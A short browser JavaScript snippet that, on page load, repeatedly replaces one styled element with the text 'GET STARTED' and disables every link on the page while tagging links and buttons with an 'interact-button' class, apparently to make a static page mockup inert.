document.addEventListener("DOMContentLoaded", () => {
  const links = document.links;
  console.log(links);

  setInterval(() => {
    const main = document.querySelector(".css-xi606m");
    main.outerHTML = "GET STARTED";
    for (let i = 0; i < links.length; i++) {
      const element = links[i];
      element.classList.add("interact-button");
      element.setAttribute("href", "javascript:void()");
      element.removeAttribute("target");
    }
    const buttons = document.getElementsByTagName("button");
    for (let i = 0; i < buttons.length; i++) {
      const element = buttons[i];
      element.classList.add("interact-button");
    }
  }, 200);
});
